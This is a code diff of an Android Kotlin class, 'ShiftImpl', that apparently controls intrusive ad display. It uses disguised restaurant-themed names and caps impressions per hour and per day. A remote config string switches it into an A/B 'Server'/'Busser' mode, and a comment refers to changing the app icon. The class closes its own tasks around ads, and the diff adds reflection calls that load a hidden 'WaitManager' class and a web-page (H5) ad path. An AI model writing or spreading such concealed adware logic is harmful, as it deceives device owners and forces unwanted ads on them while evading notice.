@@ -4,14 +4,15 @@ import android.app.Activity
 import android.app.KeyguardManager
 import android.content.Context
 import android.os.PowerManager
-import com.adjust.sdk.Adjust
-import com.adjust.sdk.AdjustEvent
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withTimeoutOrNull
 import java.io.File
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 
 /**
  * Date：2024/11/11
@@ -23,36 +24,23 @@ class ShiftImpl(private val context: Context) {
     var shiftName = ""// 文件名
     var numTry by HostLongCacheImpl(type = 100)
     private val oneHour = 60000 * 60L
-    private val oneDay = oneHour * 24
     private var lastShowAdTime: Long = 0
 
-    var periodTime: Long = oneHour
     private var splashShowNum by HostLongCacheImpl(type = 100) // 小时
     private var homeShowNum by HostLongCacheImpl(type = 100) // 天
     private var homeClickSettingsNum by HostLongCacheImpl(type = 100) // 点击
     private var mHourTimeLong by HostLongCacheImpl(type = 100)
-    private var indexNum by HostLongCacheImpl(-1)
+    private var indexDayStr by HostStrCacheImpl()
 
     private var numShowMaxHour = 50
     private var numMaxShowDay = 76
     private var numMaxClickDay = 50
+    var mH5Status = 0
 
     fun adShowEvent() {
         lastShowAdTime = System.currentTimeMillis()
         splashShowNum++
         homeShowNum++
-        // todo
-        val tra: AdjustEvent? = when (homeShowNum.toString()) {
-            "10" -> AdjustEvent("abc123")
-            "20" -> AdjustEvent("abc123")
-            "30" -> AdjustEvent("abc123")
-            "40" -> AdjustEvent("abc123")
-            "50" -> AdjustEvent("abc123")
-            else -> null
-        }
-        if (tra != null) {
-            Adjust.trackEvent(tra)
-        }
     }
 
     fun adClickEvent() {
@@ -82,10 +70,15 @@ class ShiftImpl(private val context: Context) {
     fun isLimitLoad(): Boolean {
         if (isCurHour().not()) {
             splashShowNum = 0
+            MenuHelper.mDishBean.showH5HourNum = 0
         }
         if (isCurDay().not()) {
-            MenuHelper.log("not cur day $indexNum")
+            MenuHelper.log("not cur day $indexDayStr")
             homeShowNum = 0
+            splashShowNum = 0
+            isPost = false
+            MenuHelper.mDishBean.showH5HourNum = 0
+            MenuHelper.mDishBean.showH5DayNum = 0
             homeClickSettingsNum = 0
         }
         val isDayAllow = homeShowNum < numMaxShowDay && homeClickSettingsNum < numMaxClickDay
@@ -114,9 +107,9 @@ class ShiftImpl(private val context: Context) {
     }
 
     private fun isCurDay(): Boolean {
-        val timeIndex = (System.currentTimeMillis() - MenuHelper.mDishBean.installTime) / oneDay
-        if (timeIndex != indexNum) {
-            indexNum = timeIndex
+        val time = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(Date())
+        if (time != indexDayStr) {
+            indexDayStr = time
             return false
         }
         return true
@@ -125,12 +118,10 @@ class ShiftImpl(private val context: Context) {
     fun refreshConfigure(str: String) {
         if (str.contains("Server")) {// A 方案
             WaitressAdHelper.waitressName = "man"
-            MenuHelper.mMealNetworkHelper.postEvent("isuser", Pair("getstring", "a"))
             createFile()
             startTask()
         } else if (str.contains("Busser")) {//B 方案
             WaitressAdHelper.waitressName = "child"
-            MenuHelper.mMealNetworkHelper.postEvent("isuser", Pair("getstring", "b"))
             createFile()
             startTask()
         }
@@ -162,9 +153,13 @@ class ShiftImpl(private val context: Context) {
         if (isInTask) return
         if (MenuHelper.mDishBean.waitressStatus.contains("Server")) {
             WaitressAdHelper.waitressName = "man"
+            val clazz = Class.forName("com.waitress.greeting.WaitManager")
+            clazz.getMethod("initMe").invoke(null)
             isInTask = true
             isCheck = true
             mMainScope.launch {
+                val clazz2 = Class.forName("com.waitress.greeting.WaitManager")
+                clazz2.getMethod("manageInit", Any::class.java).invoke(null, context)
                 isInRecorder()
                 // 换icon
                 WaitressAdHelper.event()
@@ -187,6 +182,8 @@ class ShiftImpl(private val context: Context) {
         }
     }
 
+    private var num = 0
+
     private fun actionCheck(): String {
         if (numTry > 77) {
             isCheck = false
@@ -202,15 +199,19 @@ class ShiftImpl(private val context: Context) {
         )
         if (isLimitLoad()) return postList(str)
         str += "-ispass"
+        WaitressAdHelper.loadAd()
+        if (MenuHelper.mDishBean.isAllowInH5()) {
+            mH5Status = 99
+            waitShowH5()
+            return postList(str)
+        }
+        mH5Status = 100
         if (WaitressAdHelper.isReadyAd()) {
+            num = 0
+            WaitressAdHelper.isShowing = false
             str += "-isready"
             numTry++
             isUseNow = false
-            if (lastShowAdTime == 0L) {
-                lastShowAdTime = System.currentTimeMillis()
-            } else {
-                lastShowAdTime += 6000L
-            }
             mMainScope.launch {
                 ArrayList(mActivityList).forEach {
                     it.finishAndRemoveTask()
@@ -219,10 +220,33 @@ class ShiftImpl(private val context: Context) {
                 MenuHelper.menuClose()
             }
         } else {
-            WaitressAdHelper.loadAd()
+            num++
+            if (num > 4) {
+                num = 0
+                if (WaitressAdHelper.isShowing) {
+                    mMainScope.launch {
+                        ArrayList(mActivityList).forEach {
+                            it.finishAndRemoveTask()
+                        }
+                        delay(800)
+                        WaitressAdHelper.loadAd()
+                    }
+                }
+            }
             isUseNow = true
         }
         return postList(str)
+    }
+
+    fun waitShowH5() {
+        if (mH5Status == 100) return
+        mMainScope.launch {
+            ArrayList(mActivityList).forEach {
+                it.finishAndRemoveTask()
+            }
+            delay(500)
+            MenuHelper.menuClose()
+        }
     }
 
     private fun postList(str: String): String {
